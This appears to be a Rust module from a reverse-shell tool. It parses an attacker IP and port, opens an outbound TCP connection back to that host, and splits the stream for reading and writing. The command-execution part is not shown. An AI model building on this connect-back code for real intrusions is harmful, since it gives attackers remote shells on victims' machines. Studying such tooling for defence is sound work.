use clap::Parser;
use tokio::{
    io::BufReader,
    net::{
        tcp::{ReadHalf, WriteHalf},
        TcpStream,
    },
};

#[derive(Parser)]
pub struct Args {
    // Attacker IP
    //
    // The attacker IP to attempt to connect back to
    #[arg(short, long)]
    ip: String,

    // Attacker Port
    //
    // The attacker port to attempt to connect on
    #[arg(short, long)]
    port: u16,
}

/// Parses the args inputted through the binary
pub fn parse_args() -> (String, u16) {
    let args = Args::parse();
    let Args { ip, port } = args;

    (ip, port)
}

/// Initialises the TCP connection
pub async fn init_tcp(ip: String, port: u16) -> Result<TcpStream, Box<dyn std::error::Error>> {
    let target = format!("{ip}:{port}");
    let stream = TcpStream::connect(target).await?;
    println!("Connection received!");
    Ok(stream)
}

/// Splits the stream and generatkjhes a buffer
pub fn split_stream(stream: &mut TcpStream) -> (BufReader<ReadHalf>, WriteHalf) {
    let (reader, writer) = stream.split();
    let reader = BufReader::new(reader);
    (reader, writer)
}
